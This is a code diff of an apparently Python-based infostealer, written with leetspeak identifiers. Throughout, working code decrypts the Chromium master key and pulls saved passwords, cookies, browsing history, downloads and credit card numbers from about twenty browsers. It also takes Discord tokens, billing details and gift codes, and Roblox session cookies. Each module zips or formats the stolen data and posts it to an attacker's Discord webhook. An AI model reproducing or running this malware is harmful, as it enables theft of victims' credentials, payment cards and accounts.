-                        if len(g1ft_c0d35_d15c0rd) > 0:
-                            g1ft_c0d35_d15c0rd = '\n\n'.join(g1ft_c0d35_d15c0rd)
+                    for method in billing_discord:
+                        if method['type'] == 1:
+                            p4ym3nt_m3th0d5_d15c0rd.append('CB')
+                        elif method['type'] == 2:
+                            p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                         else:
-                            g1ft_c0d35_d15c0rd = "None"
+                            p4ym3nt_m3th0d5_d15c0rd.append('Other')
+                    p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
+                else:
+                    p4ym3nt_m3th0d5_d15c0rd = "None"
+            except:
+                p4ym3nt_m3th0d5_d15c0rd = "None"
+
+            try:
+                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': t0k3n_d15c0rd}).json()
+                if gift_codes:
+                    codes = []
+                    for g1ft_c0d35_d15c0rd in gift_codes:
+                        name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
+                        g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
+                        data = f"Gift: {name}\nCode: {g1ft_c0d35_d15c0rd}"
+                        if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
+                            break
+                        codes.append(data)
+                    if len(codes) > 0:
+                        g1ft_c0d35_d15c0rd = '\n\n'.join(codes)
                     else:
                         g1ft_c0d35_d15c0rd = "None"
-                except:
+                else:
                     g1ft_c0d35_d15c0rd = "None"
+            except:
+                g1ft_c0d35_d15c0rd = "None"
+        
+            software_name, path = token_info.get(t0k3n_d15c0rd, ("Unknown Software", "Unknown location"))
 
-                embed = Embed(title=f'Discord Token `{username_pc} "{ip_address_public}"`:', color=color_embed)
-                embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
-                embed.add_field(name=":bust_in_silhouette: | Username:",
-                                value=f"```{u53rn4m3_d15c0rd}```", inline=True)
-                embed.add_field(name=":bust_in_silhouette: | Display Name:",
-                                value=f"```{d15pl4y_n4m3_d15c0rd}```", inline=True)
-                embed.add_field(name=":robot: | Id:",
-                                value=f"```{us3r_1d_d15c0rd}```", inline=True)
-                embed.add_field(name=":e_mail: | Email:",
-                                value=f"```{em4i1_d15c0rd}```", inline=True)
-                embed.add_field(name=":telephone_receiver: | Phone:",
-                                value=f"```{ph0n3_d15c0rd}```", inline=True)   
-                embed.add_field(name=":globe_with_meridians: | Token:",
-                                value=f"```{t0k3n_d15c0rd}```", inline=True)
-                embed.add_field(name=":rocket: | Nitro:",
-                                value=f"```{n1tr0_d15c0rd}```", inline=True)
-                embed.add_field(name=":earth_africa: | Language:",
-                                value=f"```{c0untry_d15c0rd}```", inline=True)
-                embed.add_field(name=":moneybag: | Billing:",
-                                value=f"```{p4ym3nt_m3th0d5_d15c0rd}```", inline=True)
-                embed.add_field(name=":gift: | Gift Code:",
-                                value=f"```{g1ft_c0d35_d15c0rd}```", inline=True)
-                embed.add_field(name=":lock: | Multi-Factor Authentication:",
-                                value=f"```{mf4_d15c0rd}```", inline=True)
-                embed.add_field(name=":identification_card: | Bio:",
-                                value=f"```{bi0_d15c0rd}```", inline=True)
-                embed.add_field(name=f":link: | Owner Guilds ({own3r_gui1d_c0unt}):",
-                                value=f"```{own3r_gui1d_n4m35}```", inline=True)
+            embed = Embed(title=f'Discord Token `{username_pc} "{ip_address_public}"`:', color=color_embed)
+            embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
+            embed.add_field(name=":file_folder: Path:", value=f"```{path}```", inline=False)
+            embed.add_field(name=":package: Software:", value=f"```{software_name}```", inline=True)
+            embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{u53rn4m3_d15c0rd}```", inline=True)
+            embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{d15pl4y_n4m3_d15c0rd}```", inline=True)
+            embed.add_field(name=":robot: Id:", value=f"```{us3r_1d_d15c0rd}```", inline=True)
+            embed.add_field(name=":e_mail: Email:", value=f"```{em4i1_d15c0rd}```", inline=True)
+            embed.add_field(name=":telephone_receiver: Phone:", value=f"```{ph0n3_d15c0rd}```", inline=True)   
+            embed.add_field(name=":globe_with_meridians: Token:", value=f"```{t0k3n_d15c0rd}```", inline=True)
+            embed.add_field(name=":rocket: Nitro:", value=f"```{n1tr0_d15c0rd}```", inline=True)
+            embed.add_field(name=":earth_africa: Language:", value=f"```{c0untry_d15c0rd}```", inline=True)
+            embed.add_field(name=":moneybag: Billing:", value=f"```{p4ym3nt_m3th0d5_d15c0rd}```", inline=True)
+            embed.add_field(name=":gift: Gift Code:", value=f"```{g1ft_c0d35_d15c0rd}```", inline=True)
+            embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{mf4_d15c0rd}```", inline=True)
+            embed.set_footer(text=footer_text, icon_url=avatar_embed)
+            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
 
-                embed.set_footer(text=footer_text, icon_url=avatar_embed)
-
-                self.w3bh00k.send(embed=embed, username=username_embed,
-                                  avatar_url=avatar_embed)
-
-    D15c0rd(w3bh00k_ur1)
+    upload_t0k3n5()
 '''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
@@ -668,357 +477,310 @@ def Di5c0rd_T0k3n():
 
 Br0w53r5t341 = r'''
 def Br0w53r_5t341():
-    __LOGINS__ = []
-    __COOKIES__ = []
-    __WEB_HISTORY__ = []
-    __DOWNLOADS__ = []
-    __CARDS__ = []
+    import os
+    import shutil
+    import json
+    import base64
+    import sqlite3
+    import win32crypt
+    from zipfile import ZipFile
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    from discord import SyncWebhook, Embed, File
+    from pathlib import Path
 
-    class Br0w53r:
-        def __init__(self, w3bh00k):
-            self.w3bh00k = SyncWebhook.from_url(w3bh00k)
+    PASSWORDS = []
+    COOKIES = []
+    HISTORY = []
+    DOWNLOADS = []
+    CARDS = []
+    browsers = []
 
-            Chromium()
-            Upload(self.w3bh00k)
+    def Br0ws53r_Main():
+        appdata_local = os.getenv('LOCALAPPDATA')
+        appdata_roaming = os.getenv('APPDATA')
+        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
+            
 
+        Browser = {
+            'Google Chrome': os.path.join(appdata_local, 'Google', 'Chrome', 'User Data'),
+            'Microsoft Edge': os.path.join(appdata_local, 'Microsoft', 'Edge', 'User Data'),
+            'Opera': os.path.join(appdata_roaming, 'Opera Software', 'Opera Stable'),
+            'Opera GX': os.path.join(appdata_roaming, 'Opera Software', 'Opera GX Stable'),
+            'Brave': os.path.join(appdata_local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
+            'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
+            'Internet Explorer': os.path.join(appdata_local, 'Microsoft', 'Internet Explorer'),
+            'Amigo': os.path.join(appdata_local, 'Amigo', 'User Data'),
+            'Torch': os.path.join(appdata_local, 'Torch', 'User Data'),
+            'Kometa': os.path.join(appdata_local, 'Kometa', 'User Data'),
+            'Orbitum': os.path.join(appdata_local, 'Orbitum', 'User Data'),
+            'Cent Browser': os.path.join(appdata_local, 'CentBrowser', 'User Data'),
+            '7Star': os.path.join(appdata_local, '7Star', '7Star', 'User Data'),
+            'Sputnik': os.path.join(appdata_local, 'Sputnik', 'Sputnik', 'User Data'),
+            'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
+            'Google Chrome SxS': os.path.join(appdata_local, 'Google', 'Chrome SxS', 'User Data'),
+            'Epic Privacy Browser': os.path.join(appdata_local, 'Epic Privacy Browser', 'User Data'),
+            'Uran': os.path.join(appdata_local, 'uCozMedia', 'Uran', 'User Data'),
+            'Yandex': os.path.join(appdata_local, 'Yandex', 'YandexBrowser', 'User Data'),
+            'Iridium': os.path.join(appdata_local, 'Iridium', 'User Data'),
+            'Mozilla Firefox': os.path.join(appdata_roaming, 'Mozilla', 'Firefox', 'Profiles'),
+            'Safari': os.path.join(appdata_roaming, 'Apple Computer', 'Safari'),
+        }
 
-    class Upload:
+        profiles = [
+            '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
+        ]
 
-        def __init__(self, w3bh00k: SyncWebhook):
-            self.w3bh00k = w3bh00k
-
-            self.write_files()
-            self.send()
-            self.clean()
-
-        def write_files(self):
-            os.makedirs(f"Browsers_{username_pc}", exist_ok=True)
-            if __LOGINS__:
-                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_passwords.txt", "w", encoding="utf-8") as f:
-                    f.write('\n'.join(str(x) for x in __LOGINS__))
-
-            if __COOKIES__:
-                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_cookies.txt", "w", encoding="utf-8") as f:
-                    f.write('\n'.join(str(x) for x in __COOKIES__))
-
-            if __WEB_HISTORY__:
-                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_history.txt", "w", encoding="utf-8") as f:
-                    f.write('\n'.join(str(x) for x in __WEB_HISTORY__))
-
-            if __DOWNLOADS__:
-                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_downloads.txt", "w", encoding="utf-8") as f:
-                    f.write('\n'.join(str(x) for x in __DOWNLOADS__))
-
-            if __CARDS__:
-                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_cards.txt", "w", encoding="utf-8") as f:
-                    f.write('\n'.join(str(x) for x in __CARDS__))
-
-            with ZipFile(f"Browsers_{username_pc}.zip", "w") as zip:
-                for file in os.listdir(f"Browsers_{username_pc}"):
-                    zip.write(f"Browsers_{username_pc}\\{file}", file)
-
-        def send(self):
-            self.w3bh00k.send(
-                embed=Embed(
-                    title=f"Browser Steal `{username_pc} \"{ip_address_public}\"`:",
-                    description="```" +
-                    '\n'.join(self.tree(Path(f"Browsers_{username_pc}"))) + "```",
-                    color=color_embed,
-                ).set_footer(
-                     text=footer_text,
-                     icon_url=avatar_embed
-                ),
-                file=File(f"Browsers_{username_pc}.zip"),
-                username=username_embed,
-                avatar_url=avatar_embed,
-            )
-
-        def clean(self):
-            shutil.rmtree(f"Browsers_{username_pc}")
-            os.remove(f"Browsers_{username_pc}.zip")
-
-        def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
-            pipes = {
-                'space':  '    ',
-                'branch': '│   ',
-                'tee':    '├── ',
-                'last':   '└── ',
-            }
-
-            if prefix == '':
-                yield midfix_folder + path.name
-
-            contents = list(path.iterdir())
-            pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
-            for pointer, path in zip(pointers, contents):
-                if path.is_dir():
-                    yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
-                    extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
-                    yield from self.tree(path, prefix=prefix+extension)
-                else:
-                    yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
-        
-
-    class Chromium:
-
-        def __init__(self):
-            self.appdata = os.getenv('LOCALAPPDATA')
-            self.browsers = {
-                'amigo': self.appdata + '\\Amigo\\User Data',
-                'torch': self.appdata + '\\Torch\\User Data',
-                'kometa': self.appdata + '\\Kometa\\User Data',
-                'orbitum': self.appdata + '\\Orbitum\\User Data',
-                'cent-browser': self.appdata + '\\CentBrowser\\User Data',
-                '7star': self.appdata + '\\7Star\\7Star\\User Data',
-                'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
-                'vivaldi': self.appdata + '\\Vivaldi\\User Data',
-                'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
-                'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
-                'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
-                'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
-                'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
-                'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
-                'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
-                'iridium': self.appdata + '\\Iridium\\User Data',
-            }
-            self.profiles = [
-                'Default',
-                'Profile 1',
-                'Profile 2',
-                'Profile 3',
-                'Profile 4',
-                'Profile 5',
-            ]
-
-            for _, path in self.browsers.items():
-                if not os.path.exists(path):
-                    continue
-
-                self.master_key = self.get_master_key(f'{path}\\Local State')
-                if not self.master_key:
-                    continue
-
-                for profile in self.profiles:
-                    if not os.path.exists(path + '\\' + profile):
-                        continue
-
-                    operations = [
-                        self.get_login_data,
-                        self.get_cookies,
-                        self.get_web_history,
-                        self.get_downloads,
-                        self.get_credit_cards,
-                    ]
-
-                    for operation in operations:
-                        try:
-                            operation(path, profile)
-                        except:
-                            pass
-
-        def get_master_key(self, path: str) -> str:
+        for browser, path in Browser.items():
             if not os.path.exists(path):
-                return
+                continue
 
-            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
-                return
+            master_key = get_master_key(os.path.join(path, 'Local State'))
+            if not master_key:
+                continue
 
-            with open(path, "r", encoding="utf-8") as f:
-                c = f.read()
-            local_state = json.loads(c)
+            for profile in profiles:
+                profile_path = os.path.join(path, profile)
+                if not os.path.exists(profile_path):
+                    continue
 
-            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+                get_passwords(browser, path, profile_path, master_key)
+                get_cookies(browser, path, profile_path, master_key)
+                get_history(browser, path, profile_path)
+                get_downloads(browser, path, profile_path)
+                get_cards(browser, path, profile_path, master_key)
+
+                if browser not in browsers:
+                    browsers.append(browser)
+
+        write_files(username_pc)
+        send_files(username_pc, w3bh00k)
+        clean_files(username_pc)
+
+    def get_master_key(path):
+        if not os.path.exists(path):
+            return None
+
+        try:
+            with open(path, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+
+            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
             return master_key
+        except:
+            return None
 
-        def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
+    def decrypt_password(buff, master_key):
+        try:
             iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
+            payload = buff[15:-16]
+            tag = buff[-16:]
+            cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
+            decryptor = cipher.decryptor()
+            decrypted_pass = decryptor.update(payload) + decryptor.finalize()
+            return decrypted_pass.decode()
+        except:
+            return None
 
-            return decrypted_pass
-
-        def get_login_data(self, path: str, profile: str):
-            login_db = f'{path}\\{profile}\\Login Data'
-            if not os.path.exists(login_db):
-                return
-
-            shutil.copy(login_db, 'login_db')
-            conn = sqlite3.connect('login_db')
+    def list_tables(db_path):
+        try:
+            conn = sqlite3.connect(db_path)
             cursor = conn.cursor()
-            cursor.execute(
-                'SELECT action_url, username_value, password_value FROM logins')
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+            tables = cursor.fetchall()
+            conn.close()
+            return tables
+        except:
+            return []
+
+    def get_passwords(browser, path, profile_path, master_key):
+        password_db = os.path.join(profile_path, 'Login Data')
+        if not os.path.exists(password_db):
+            return
+
+        shutil.copy(password_db, 'password_db')
+        tables = list_tables('password_db')
+
+        conn = sqlite3.connect('password_db')
+        cursor = conn.cursor()
+
+        try:
+            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+            PASSWORDS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
             for row in cursor.fetchall():
                 if not row[0] or not row[1] or not row[2]:
                     continue
-
-                url = f"- [+] |URL|: {row[0]}"
-                username = f"   |USERNAME|: {row[1]}"
-                password = f"   |PASSWORD|: {self.decrypt_password(row[2], self.master_key)}"
-                __LOGINS__.append(Types.Login(url, username, password))
-
+                url =      f"- Url      : {row[0]}"
+                username = f"  Username : {row[1]}"
+                password = f"  Password : {decrypt_password(row[2], master_key)}"
+                PASSWORDS.append(f"{url}\n{username}\n{password}\n")
+        except:
+            pass
+        finally:
             conn.close()
-            os.remove('login_db')
+            os.remove('password_db')
 
-        def get_cookies(self, path: str, profile: str):
-            cookie_db = f'{path}\\{profile}\\Network\\Cookies'
-            if not os.path.exists(cookie_db):
-                return
+    def get_cookies(browser, path, profile_path, master_key):
+        cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
+        if not os.path.exists(cookie_db):
+            return
 
-            try:
-                shutil.copy(cookie_db, 'cookie_db')
-                conn = sqlite3.connect('cookie_db')
-                cursor = conn.cursor()
-                cursor.execute(
-                    'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
-                for row in cursor.fetchall():
-                    if not row[0] or not row[1] or not row[2] or not row[3]:
-                        continue
-                    url = f"- [+] |URL|: {row[0]}"
-                    name = f"  |NAME|: {row[1]}"
-                    path = f"  |PATH|: {row[2]}"
-                    cookie = f"  |COOKIE|: {self.decrypt_password(row[3], self.master_key)}"
-                    expire = f"  |EXPIRE|: {row[4]}"
-
-                    __COOKIES__.append(Types.Cookie(url, name, path, cookie, expire))
-                conn.close()
-            except:
-                pass
-
-            os.remove('cookie_db')
-
-        def get_web_history(self, path: str, profile: str):
-            web_history_db = f'{path}\\{profile}\\History'
-            if not os.path.exists(web_history_db):
-                return
-
-            shutil.copy(web_history_db, 'web_history_db')
-            conn = sqlite3.connect('web_history_db')
+        conn = None 
+        try:
+            shutil.copy(cookie_db, 'cookie_db')
+            conn = sqlite3.connect('cookie_db')
             cursor = conn.cursor()
-            cursor.execute('SELECT url, title, last_visit_time FROM urls')
-            for row in cursor.fetchall():
-                if not row[0] or not row[1] or not row[2]:
-                    continue
-                url = f"- [+] |URL|: {row[0]}"
-                title = f"  |TITLE|: {row[1]}"
-                time = f"  |TIME|: {row[2]}"
-                __WEB_HISTORY__.append(Types.WebHistory(url, title, time))
-
-            conn.close()
-            os.remove('web_history_db')
-
-        def get_downloads(self, path: str, profile: str):
-            downloads_db = f'{path}\\{profile}\\History'
-            if not os.path.exists(downloads_db):
-                return
-
-            shutil.copy(downloads_db, 'downloads_db')
-            conn = sqlite3.connect('downloads_db')
-            cursor = conn.cursor()
-            cursor.execute('SELECT tab_url, target_path FROM downloads')
-            for row in cursor.fetchall():
-                if not row[0] or not row[1]:
-                    continue
-                
-                path = f"- [+] |PATH|: {row[1]}"
-                url = f"  |URL|: {row[0]}"
-                __DOWNLOADS__.append(Types.Download(path, url))
-
-            conn.close()
-            os.remove('downloads_db')
-
-        def get_credit_cards(self, path: str, profile: str):
-            cards_db = f'{path}\\{profile}\\Web Data'
-            if not os.path.exists(cards_db):
-                return
-
-            shutil.copy(cards_db, 'cards_db')
-            conn = sqlite3.connect('cards_db')
-            cursor = conn.cursor()
-            cursor.execute(
-                'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
+            COOKIES.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
             for row in cursor.fetchall():
                 if not row[0] or not row[1] or not row[2] or not row[3]:
                     continue
-                name = f"- [+] |NAME|: {row[0]}"
-                expiration_month = f"  |EXPIRATION MOUNTH|: {row[1]}"
-                expiration_year = f"  |EXPIRATION YEAR|: {row[2]}"
-                card_number = f"  |CARD NUMBER|: {self.decrypt_password(row[3], self.master_key)}"
-                date_modified = f"  |DATE MODIFIED|: {row[4]}"
-                __CARDS__.append(Types.CreditCard(name, expiration_month, expiration_year, card_number, date_modified))
+                url =    f"- Url    : {row[0]}"
+                name =   f"  Name   : {row[1]}"
+                path =   f"  Path   : {row[2]}"
+                cookie = f"  Cookie : {decrypt_password(row[3], master_key)}"
+                expire = f"  Expire : {row[4]}"
+                COOKIES.append(f"{url}\n{name}\n{path}\n{cookie}\n{expire}\n")
+        except:
+            pass
+        finally:
+            if conn:
+                conn.close()
+            try:
+                os.remove('cookie_db')
+            except:
+                pass
 
-            conn.close()
-            os.remove('cards_db')
 
+    def get_history(browser, path, profile_path):
+        history_db = os.path.join(profile_path, 'History')
+        if not os.path.exists(history_db):
+            return
 
-    class Types:
-        class Login:
-            def __init__(self, url, username, password):
-                self.url = url
-                self.username = username
-                self.password = password
+        shutil.copy(history_db, 'history_db')
+        conn = sqlite3.connect('history_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT url, title, last_visit_time FROM urls')
+        HISTORY.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2]:
+                continue
+            url =   f"- Url   : {row[0]}"
+            title = f"  Title : {row[1]}"
+            time =  f"  Time  : {row[2]}"
+            HISTORY.append(f"{url}\n{title}\n{time}\n")
 
-            def __str__(self):
-                return f'{self.url}\t{self.username}\t{self.password}'
+        conn.close()
+        os.remove('history_db')
 
-            def __repr__(self):
-                return self.__str__()
+    def get_downloads(browser, path, profile_path):
+        downloads_db = os.path.join(profile_path, 'History')
+        if not os.path.exists(downloads_db):
+            return
 
-        class Cookie:
-            def __init__(self, host, name, path, value, expires):
-                self.host = host
-                self.name = name
-                self.path = path
-                self.value = value
-                self.expires = expires
+        shutil.copy(downloads_db, 'downloads_db')
+        conn = sqlite3.connect('downloads_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT tab_url, target_path FROM downloads')
+        DOWNLOADS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
+        for row in cursor.fetchall():
+            if not row[0] or not row[1]:
+                continue
+            path = f"- Path : {row[1]}"
+            url =  f"  Url  : {row[0]}"
+            DOWNLOADS.append(f"{path}\n{url}\n")
 
-            def __str__(self):
-                return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'
+        conn.close()
+        os.remove('downloads_db')
 
-            def __repr__(self):
-                return self.__str__()
+    def get_cards(browser, path, profile_path, master_key):
+        cards_db = os.path.join(profile_path, 'Web Data')
+        if not os.path.exists(cards_db):
+            return
 
-        class WebHistory:
-            def __init__(self, url, title, timestamp):
-                self.url = url
-                self.title = title
-                self.timestamp = timestamp
+        shutil.copy(cards_db, 'cards_db')
+        conn = sqlite3.connect('cards_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+        CARDS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2] or not row[3]:
+                continue
+            name =             f"- Name             : {row[0]}"
+            expiration_month = f"  Expiration Month : {row[1]}"
+            expiration_year =  f"  Expiration Year  : {row[2]}"
+            card_number =      f"  Card Number      : {decrypt_password(row[3], master_key)}"
+            date_modified =    f"  Date Modified    : {row[4]}"
+            CARDS.append(f"{name}\n{expiration_month}\n{expiration_year}\n{card_number}\n{date_modified}\n")
 
-            def __str__(self):
-                return f'{self.url}\t{self.title}\t{self.timestamp}'
+        conn.close()
+        os.remove('cards_db')
 
-            def __repr__(self):
-                return self.__str__()
+    def write_files(username_pc):
+        os.makedirs(f"Browser_{username_pc}", exist_ok=True)
 
-        class Download:
-            def __init__(self, tab_url, target_path):
-                self.tab_url = tab_url
-                self.target_path = target_path
+        if PASSWORDS:
+            with open(f"Browser_{username_pc}\\Passwords_{username_pc}.txt", "w", encoding="utf-8") as f:
+                f.write('\n'.join(PASSWORDS))
 
-            def __str__(self):
-                return f'{self.tab_url}\t{self.target_path}'
+        if COOKIES:
+            with open(f"Browser_{username_pc}\\Cookies_{username_pc}.txt", "w", encoding="utf-8") as f:
+                f.write('\n'.join(COOKIES))
 
-            def __repr__(self):
-                return self.__str__()
+        if HISTORY:
+            with open(f"Browser_{username_pc}\\History_{username_pc}.txt", "w", encoding="utf-8") as f:
+                f.write('\n'.join(HISTORY))
 
-        class CreditCard:
-            def __init__(self, name, month, year, number, date_modified):
-                self.name = name
-                self.month = month
-                self.year = year
-                self.number = number
-                self.date_modified = date_modified
+        if DOWNLOADS:
+            with open(f"Browser_{username_pc}\\Downloads_{username_pc}.txt", "w", encoding="utf-8") as f:
+                f.write('\n'.join(DOWNLOADS))
 
-            def __str__(self):
-                return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'
+        if CARDS:
+            with open(f"Browser_{username_pc}\\Cards_{username_pc}.txt", "w", encoding="utf-8") as f:
+                f.write('\n'.join(CARDS))
 
-            def __repr__(self):
-                return self.__str__()
-            
-    Br0w53r(w3bh00k_ur1)
+        with ZipFile(f"Browser_{username_pc}.zip", "w") as zipf:
+            for file in os.listdir(f"Browser_{username_pc}"):
+                zipf.write(os.path.join(f"Browser_{username_pc}", file), file)
+
+    def send_files(username_pc, w3bh00k):
+        w3bh00k.send(
+            embed=Embed(
+                title=f'Browser Steal  `{username_pc} "{ip_address_public}"`:',
+                description=f"Found In **{'**, **'.join(browsers)}**:```" + '\n'.join(tree(Path(f"Browser_{username_pc}"))) + "```",
+                color=color_embed,
+            ).set_footer(
+                text=footer_text,
+                icon_url=avatar_embed
+            ),
+            file=File(fp=f"Browser_{username_pc}.zip", filename=f"Browser_{username_pc}.zip"),
+        )
+
+    def clean_files(username_pc):
+        shutil.rmtree(f"Browser_{username_pc}")
+        os.remove(f"Browser_{username_pc}.zip")
+
+    def tree(path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
+        pipes = {
+            'space':  '    ',
+            'branch': '│   ',
+            'tee':    '├── ',
+            'last':   '└── ',
+        }
+
+        if prefix == '':
+            yield midfix_folder + path.name
+
+        contents = list(path.iterdir())
+        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
+        for pointer, path in zip(pointers, contents):
+            if path.is_dir():
+                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
+                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
+                yield from tree(path, prefix=prefix+extension)
+            else:
+                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
+    Br0ws53r_Main()
 '''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
@@ -1027,6 +789,13 @@ def Br0w53r_5t341():
 
 R0b10xC00ki3 = r'''
 def R0b10x_C00ki3():
+    import browser_cookie3
+    import requests
+    import json
+    from discord import SyncWebhook, Embed
+    import discord
+
+    c00ki35_list = []
     def g3t_c00ki3_4nd_n4vig4t0r(br0ws3r_functi0n):
         try:
             c00kie5 = br0ws3r_functi0n()
@@ -1037,88 +806,81 @@ def R0b10x_C00ki3():
         except:
             return None, None
 
-    def Edg3():
+    def Microsoft_Edge():
         return browser_cookie3.edge(domain_name="roblox.com")
 
-    def Chr0m3():
+    def Google_Chrome():
         return browser_cookie3.chrome(domain_name="roblox.com")
 
-    def F1r3f0x():
+    def Firefox():
         return browser_cookie3.firefox(domain_name="roblox.com")
 
-    def Op3r4():
+    def Opera():
         return browser_cookie3.opera(domain_name="roblox.com")
+    
+    def Opera_GX():
+        return browser_cookie3.opera_gx(domain_name="roblox.com")
 
-    def S4f4r1():
+    def Safari():
         return browser_cookie3.safari(domain_name="roblox.com")
 
-    def Br4v3():
+    def Brave():
         return browser_cookie3.brave(domain_name="roblox.com")
 
-    br0ws3r5 = [Edg3, Chr0m3, F1r3f0x, Op3r4, S4f4r1, Br4v3]
+    br0ws3r5 = [Microsoft_Edge, Google_Chrome, Firefox, Opera, Opera_GX, Safari, Brave]
     for br0ws3r in br0ws3r5:
         c00ki3, n4vigator = g3t_c00ki3_4nd_n4vig4t0r(br0ws3r)
         if c00ki3:
-            try:
-                inf0 = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": c00ki3})
-                d4t4 = json.loads(inf0.text)
-            except:
-                pass
+            if c00ki3 not in c00ki35_list:
+                c00ki35_list.append(c00ki3)
+                try:
+                    inf0 = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": c00ki3})
+                    api = json.loads(inf0.text)
+                except:
+                    pass
 
-            try:
-                us3rn4m3_r0b10x = d4t4['UserName']
-            except:
-                us3rn4m3_r0b10x = "None"
+                us3r_1d_r0b10x = api.get('id', "None")
+                d1spl4y_nam3_r0b10x = api.get('displayName', "None")
+                us3rn4m3_r0b10x = api.get('name', "None")
+                r0bux_r0b10x = api.get("RobuxBalance", "None")
+                pr3mium_r0b10x = api.get("IsPremium", "None")
+                av4t4r_r0b10x = api.get("ThumbnailUrl", "None")
+                bui1d3r5_c1ub_r0b10x = api.get("IsAnyBuildersClubMember", "None")
+        
+                size_c00ki3 = len(c00ki3)
+                middle_c00ki3 = size_c00ki3 // 2
+                c00ki3_part1 = c00ki3[:middle_c00ki3]
+                c00ki3_part2 = c00ki3[middle_c00ki3:]
 
-            try:
-                us3r_1d_r0b10x = d4t4["UserID"]
-            except:
-                us3r_1d_r0b10x = "None"
+                w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
 
-            try:
-                r0bux_r0b10x = d4t4["RobuxBalance"]
-            except:
-                r0bux_r0b10x = "None"
+                embed = discord.Embed(
